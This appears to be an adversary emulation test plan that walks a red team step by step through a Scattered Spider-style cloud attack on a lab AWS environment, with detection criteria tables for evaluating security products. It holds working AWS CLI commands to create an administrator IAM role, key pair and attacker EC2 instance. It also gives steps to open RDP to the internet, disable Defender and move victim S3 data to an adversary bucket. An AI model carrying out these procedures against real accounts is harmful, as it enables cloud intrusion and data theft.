# Protections Test 7 Scenario

[1]:https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a

[3]:https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf

[4]:https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries

[5]:https://youtu.be/H0CmqRCx_R8?t=1146

[6]:https://cloud.google.com/blog/topics/threat-intelligence/unc3944-proactive-hardening-recommendations/

[10]:https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud

[11]:https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/

[13]:https://www.trellix.com/blogs/research/scattered-spider-the-modus-operandi/

## Step 0 - Setup

### Procedures

- ☣️ Initiate an RDP session to the Kali attack host `driftmark (174.3.0.70)`

  | Destination | Username | Password
  |  - | - | -
  | 174.3.0.70 | op1 | Barbed-Directive

## Step 1 - Initial Access

### Voice Track

Step 1 emulates Scattered Spider using a compromised cloud administrator `sstark` for the
vale domain to log in to the SSO dashboard (`https://sso.vale.net/`). After
logging in to the SSO dashboard, Scattered Spider is able to access the AWS console
through SSO. With access to the AWS console, Scattered Spider uses CloudShell to create
an IAM role with administrative access and a key pair for use in creating an EC2
instance.

### Procedures

- ☣️ From Kali, open a new browser window then navigate to the redirector link.
This should redirect to the victim SSO dashboard (`https://sso.vale.net/`). Log
in using the provided SSO credentials.

  | Destination | Username | Password
  |  - | - | -
  | <https://goldcloaks.org> | sstark | Flourish-Paradox

- ☣️ When prompted for an MFA token, open a terminal in Kali and run the follow
command, entering the following password when prompted then copy and paste the
OTP into the SSO portal to log in

  | Password
  |  -
  | Decode-Acclimate

  ```bash
  totp-cli generate --follow vale vale-sstark
  ```

  - ***Expected Output***

    ```text
    ######
    ```

- ☣️ From the SSO dashboard, click on AWS. In the AWS console, ensure the region
is set to `us-east-1`

- ☣️ In the AWS console, search for and open "CloudShell". Run the following
commands to create an IAM role and profile with administrator access:

  ```bash
  aws iam create-role --role-name sisterton-role --assume-role-policy-document '{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": ["sts:AssumeRole"],"Principal": {"Service": ["ec2.amazonaws.com"]}}]}' --description "IAM role for sisterton";
  aws iam attach-role-policy --role-name sisterton-role --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess";
  aws iam create-instance-profile --instance-profile-name sisterton-role;
  aws iam add-role-to-instance-profile --instance-profile-name sisterton-role --role-name sisterton-role
  ```

  - ***Expected Output***

    ```text
    {
        "Role": {
            "Path": "/",
            "RoleName": "sisterton-role",
            "RoleId": "...",
            "Arn": "arn:aws:iam::...:role/sisterton-role",
            "CreateDate": "...",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Action": [
                            "sts:AssumeRole"
                        ],
                        "Principal": {
                            "Service": [
                                "ec2.amazonaws.com"
                            ]
                        }
                    }
                ]
            }
        }
    }

    {
        "InstanceProfile": {
            "Path": "/",
            "InstanceProfileName": "sisterton-role",
            "InstanceProfileId": "...",
            "Arn": "arn:aws:iam::...:instance-profile/sisterton-role",
            "CreateDate": "...",
            "Roles": []
        }
    }
    ```

- ☣️ In the same CloudShell terminal session, run the following command to create
an SSH key pair. Copy the private key output and save the contents in a text
file on Kali.

  ```bash
  aws ec2 create-key-pair --key-name sisterton --key-type rsa --key-format pem --query "KeyMaterial" --output text
  ```

  - ***Expected Output***

    ```text
    -----BEGIN RSA PRIVATE KEY-----
    ...
    ...
    -----END RSA PRIVATE KEY-----
    ```

- ☣️ In the AWS console, search for and open "CloudShell". Run the following
commands to create a Windows EC2 instance and assign the previously created IAM
profile, key, and role to the instance:

  ```bash
  vpc_id=$(aws ec2 describe-vpcs --filters Name=tag:Name,Values=REPLACE_WITH_VPC_NAME | jq -r -c '[.Vpcs | .[]][0].VpcId');
  subnet_id=$(aws ec2 describe-subnets --filters Name=vpc-id,Values=$vpc_id Name=cidr-block,Values=10.212.3.0/24| jq -r -c '[.Subnets | .[]][0].SubnetId');
  group_id=$(aws ec2 describe-security-groups --filters Name=group-name,Values=REPLACE_WITH_SECURITY_GROUP_NAME* | jq -r -c '[.SecurityGroups | .[]][0].GroupId');
  image_id=ami-036bd412dc38dc55c;
  result=$(aws ec2 run-instances --image-id "$image_id" \
      --instance-type "t3.large" \
      --block-device-mappings '{"DeviceName":"/dev/sda1","Ebs":{"Encrypted":false,"DeleteOnTermination":true,"Iops":3000,"VolumeSize":30,"VolumeType":"gp3","Throughput":125}}' \
      --network-interfaces '{"SubnetId":"'$subnet_id'","DeleteOnTermination":true,"AssociatePublicIpAddress":false,"DeviceIndex":0,"PrivateIpAddresses":[{"Primary":true,"PrivateIpAddress":"10.115.5.100"}],"Groups":["'$group_id'"]}' \
      --credit-specification '{"CpuCredits":"unlimited"}' \
      --tag-specifications '{"ResourceType":"instance","Tags":[{"Key":"Name","Value":"sisterton"},{"Key":"Hostname","Value":"sisterton"}]}' \
      --metadata-options '{"HttpEndpoint":"enabled","HttpPutResponseHopLimit":2,"HttpTokens":"required"}' \
      --private-dns-name-options '{"HostnameType":"ip-name","EnableResourceNameDnsARecord":true,"EnableResourceNameDnsAAAARecord":false}' \
      --count "1" --key-name "sisterton" --user-data "$user_data" --iam-instance-profile '{"Name":"sisterton-role"}');
  echo $result | jq;
  ```

  - ***Expected Output***

    ```text
    {
      "ReservationId": "...",
      "OwnerId": "...",
      "Groups": [],
      "Instances": [
        {
          "Architecture": "x86_64",
          "BlockDeviceMappings": [],
          "ClientToken": "...",
          "EbsOptimized": false,
          "EnaSupport": true,
          "Hypervisor": "xen",
          "IamInstanceProfile": {
            "Arn": "arn:aws:iam::...:instance-profile/sisterton-role",
            "Id": "..."
          },
          "NetworkInterfaces": [
            {
              "Attachment": {
                "AttachTime": "...",
                "AttachmentId": "...",
                "DeleteOnTermination": true,
                "DeviceIndex": 0,
                "Status": "attaching",
                "NetworkCardIndex": 0
              },
              "Description": "",
              "Groups": [
                {
                  "GroupId": "...",
                  "GroupName": "REPLACE_WITH_SECURITY_GROUP_NAME"
                }
              ],
              "Ipv6Addresses": [],
              "MacAddress": "...",
              "NetworkInterfaceId": "...",
              "OwnerId": "...",
              "PrivateDnsName": "...",
              "PrivateIpAddress": "...",
              "PrivateIpAddresses": [
                {
                  "Primary": true,
                  "PrivateDnsName": "...",
                  "PrivateIpAddress": "..."
                }
              ],
              "SourceDestCheck": true,
              "Status": "in-use",
              "SubnetId": "...",
              "VpcId": "...",
              "InterfaceType": "interface",
              "Operator": {
                "Managed": false
              }
            }
          ],
          "RootDeviceName": "/dev/sda1",
          "RootDeviceType": "ebs",
          "SecurityGroups": [
            {
              "GroupId": "...",
              "GroupName": "REPLACE_WITH_SECURITY_GROUP_NAME"
            }
          ],
          "SourceDestCheck": true,
          "StateReason": {
            "Code": "pending",
            "Message": "pending"
          },
          "Tags": [
            {
              "Key": "Hostname",
              "Value": "sisterton"
            },
            {
              "Key": "Name",
              "Value": "sisterton"
            }
          ],
          "VirtualizationType": "hvm",
          "CpuOptions": {
            "CoreCount": 1,
            "ThreadsPerCore": 2
          },
          "CapacityReservationSpecification": {
            "CapacityReservationPreference": "open"
          },
          "MetadataOptions": {
            "State": "pending",
            "HttpTokens": "required",
            "HttpPutResponseHopLimit": 2,
            "HttpEndpoint": "enabled",
            "HttpProtocolIpv6": "disabled",
            "InstanceMetadataTags": "disabled"
          },
          "EnclaveOptions": {
            "Enabled": false
          },
          "PrivateDnsNameOptions": {
            "HostnameType": "ip-name",
            "EnableResourceNameDnsARecord": true,
            "EnableResourceNameDnsAAAARecord": false
          },
          "MaintenanceOptions": {
            "AutoRecovery": "default"
          },
          "CurrentInstanceBootMode": "legacy-bios",
          "Operator": {
            "Managed": false
          },
          "InstanceId": "...",
          "ImageId": "ami-0c765d44cf1f25d26",
          "State": {
            "Code": 0,
            "Name": "pending"
          },
          "PrivateDnsName": "...",
          "PublicDnsName": "",
          "StateTransitionReason": "",
          "KeyName": "sisterton",
          "AmiLaunchIndex": 0,
          "ProductCodes": [],
          "InstanceType": "t3.large",
          "LaunchTime": "...",
          "Placement": {
            "GroupName": "",
            "Tenancy": "default",
            "AvailabilityZone": "..."
          },
          "Platform": "windows",
          "Monitoring": {
            "State": "disabled"
          },
          "SubnetId": "...",
          "VpcId": "...",
          "PrivateIpAddress": "10.115.5.100"
        }
      ]
    }
    ```

- ☣️ In the AWS console, search for "EC2", and right-click to open the "EC2"
console in a new tab. Under "Instances" click on "Instances" and verify that the
newly created instance appears and is in the Running state.

- ☣️ In the AWS EC2 console, in the left navigation pane under "Network &
Security" select "Security Groups". Select the security group ID with the
security group name following the pattern of `REPLACE_WITH_SECURITY_GROUP_NAME` to open the
additional configuration details

- ☣️ Click the "Edit inbound rules" button. In the "Edit inbound rules" page,
click "Add rule" then set the "Port range" to `3389` and "Source" to
"Anywhere-IPv4". Then click "Save rules"

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1078.002 | Valid Accounts: Domain Accounts | Linux, Identity Provider | Adversary successfully authenticated to AWS as sstark | Not Calibrated - Not Benign | Scattered Spider authenticates to the domain as `sstark` | bloodygate (10.26.5.101) | sstark | - | [11], [13]
| Execution | T1059.009 | Command and Scripting Interpreter: Cloud API | IaaS | sstark executed AWS CloudShell | Calibrated - Not Benign | Scattered Spider uses AWS CloudShell | - | sstark | - | [10]
| Persistence | T1098.003 | Account Manipulation: Additional Cloud Roles | IaaS | sstark created an admin IAM role (sisterton-role) and associated instance profile  | Calibrated - Not Benign | Scattered Spider creates an admin IAM role and associated instance profile to attach to EC2 instances. | - | sstark | - | [10]
| Persistence | T1098.001 | Account Manipulation: Additional Cloud Credentials | IaaS | sstark created an SSH key pair for accessing EC2 instances | Calibrated - Not Benign | Scattered Spider creates an SSH key pair for accessing EC2 instances. | - | sstark | - | [10]
| Defense Evasion | T1578.002 | Modify Cloud Compute Infrastructure: Create Cloud Instance | IaaS | sstark created an EC2 instance called sisterton-role | Calibrated - Not Benign | Scattered Spider creates an EC2 instance | - | sstark | - | [10]
| Persistence | T1098.003 | Account Manipulation: Additional Cloud Roles | IaaS | sstark configured the sisterton EC2 instance with the administrator IAM role and associated instance profile | Calibrated - Not Benign | Scattered Spider configures the EC2 instance with the administrator IAM role and associated instance profile | - | sstark | - | [10]
| Defense Evasion | T1562.007 | Impair Defenses: Disable or Modify Cloud Firewall | IaaS | sstark added a security group rule to allow RDP | Calibrated - Not Benign | Scattered Spider adds a security group rule to allow RDP | - | sstark | - | [5], [6]

## Step 2 - Exfiltration

### Voice Track

With the adversary-created Windows EC2 instance, Scattered Spider connects to the
instance via RDP and downloads S3 Browser. By authenticating using the EC2
instance's IAM role, Scattered Spider enumerates the victim organization's S3 buckets
using S3 Browser. Scattered Spider then uses S3 Browser to download files from the victim
S3 bucket then exfiltrates them to their own adversary-controlled S3 bucket.

### Procedures

- ☣️ In the AWS EC2 console, right-click on the newly created instance, select
"Connect", then select "RDP client". Under the "Password" section, click "Get
password" and paste the SSH key that was saved earlier to Kali to get the
`Administrator` password to the adversary Windows instance. Save the password to
a text file on Kali.

- ☣️ From a command prompt on Kali, replace the `<REPLACE_ADMIN_PW>` with the
password obtained in the previous procedure. Enclose the password with single
quotes if the generated password contains special characters. Execute the
following to RDP to the adversary Windows instance, press 'y' if prompted to
trust the certificate

  ```bash
  xfreerdp3 +clipboard /u:Administrator /p:'<REPLACE_ADMIN_PW>' /v:10.115.5.100
  ```

- ☣️ In the RDP to the adversary Windows instance, if prompted with "Do you want
to allow your PC to be discoverable by other PCs and devices on this network?",
select "Yes".

- ☣️ In the RDP to the adversary Windows instance, search for Virus and threat
protection > Manage settings > disable all toggles

- ☣️ In the RDP to the adversary Windows instance, open Edge. In the first time
use prompt, click "Start without your data" then in the following prompts,
uncheck any boxes and confirm/continue. Once first time use is complete, browse
to download S3 Browser

  | Destination
  |  -
  | <https://s3browser.com/download/s3browser-12-2-9.exe>

- ☣️ Once the download has completed, open the Downloads folder then double click
to execute and install S3 Browser to the adversary Windows instances. Accept the
license agreement and click "Next" through the install configurations to use the
defaults then "Finish" to open S3 browser.

- ☣️ In the S3 Browser Add New Account window, for the "Account Name" enter "vale"

- ☣️ In the S3 Browser Add New Account window, for the "Account Type" select
"Amazon S3 via EC2 IAM Role". Leave the SSL checked then click "Add new account"

- ☣️ In the list of buckets, click to open REPLACE_WITH_S3_BUCKET_NAME

- ☣️ Select all the contents of the bucket then click the "Download" button and
set the location to the Downloads folder

- ☣️ In the S3 Browser toolbar, click Accounts > Add new account.. to add the
adversary S3 bucket

- ☣️ In the S3 Browser Add New Account window, for the "Account Name" enter
"backup"

- ☣️ In the S3 Browser Add New Account window, for the "Account Type" select
"Amazon S3 Storage"

- ☣️ Return to Kali and obtain the adversary AWS access keys

- ☣️ Copy the "Access key ID" to the clipboard. Return to the RDP to the Windows
instance and in the S3 Browser Add New Account window, paste the clipboard
contents into the "Access Key ID" field

- ☣️ Return to Kali and copy the "Secret access key" to the clipboard. Return to
the RDP to the Windows instance and in the S3 Browser Add New Account window,
paste the clipboard contents into the "Secret Access Key" field

- ☣️ Leave "Encrypt Access Keys..." unchecked and "Use secure transfer" checked
then click "Add new account"

- ☣️ In the S3 Browser toolbar, click Accounts > backup. In the prompt "Would you
like to add an External Bucket?", select "Yes"

- ☣️ Return to Kali and copy the "Bucket" to the clipboard. Return to the RDP to
the Windows instance and in the S3 Browser Add New Account window, paste the
clipboard contents into the "Bucket name" field then click "Add External bucket"

- ☣️ In the S3 Browser, click "Upload" > "Upload folder(s)". Select all the
downloaded files from the `vale` bucket and click "Open" to exfiltrate the files
to the adversary bucket.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | Windows | sstark connected to an adversary windows instance sisterton (10.115.5.100) using RDP | Calibrated - Not Benign | Scattered Spider connects to adversary Windows instance `sisterton (10.115.5.100)` using RDP | sisterton (10.115.5.100) | Administrator | - | [10]
| Command and Control | T1105 | Ingress Tool Transfer | Windows | msedge.exe downloaded s3browser to sisterton (10.115.5.100) | Calibrated - Not Benign | Scattered Spider downloads S3 browser to the adversary Windows instance | sisterton (10.115.5.100) | Administrator | - | [4], [10]
| Privilege Escalation | T1098.003 | Account Manipulation: Additional Cloud Roles | Windows | Adversary authenticated to AWS via sisterton-role | Calibrated - Not Benign | Scattered Spider authenticates to the AWS account via EC2 IAM role | sisterton (10.115.5.100) | Administrator | - | [10]
| Discovery | T1619 | Cloud Storage Object Discovery | IaaS | sisterton-role enumerates victim S3 buckets | Calibrated - Not Benign | Scattered Spider uses S3 Browser to enumerate victim S3 buckets | sisterton (10.115.5.100) | Administrator | - | [4], [10]
| Collection | T1530 | Data from Cloud Storage | IaaS | sisterton-role downloaded files from S3 bucket to sisterton (10.115.5.100) | Calibrated - Not Benign | Scattered Spider uses S3 Browser to download files from victim S3 bucket to the adversary Windows instance | sisterton (10.115.5.100) | Administrator | - | [1], [4], [10]
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | IaaS | Adversary exfiltrated files to an adversary S3 bucket | Calibrated - Not Benign | Scattered Spider uses S3 Browser to exfiltrate files to an adversary S3 bucket | sisterton (10.115.5.100) | Administrator | - | [3], [4], [10]
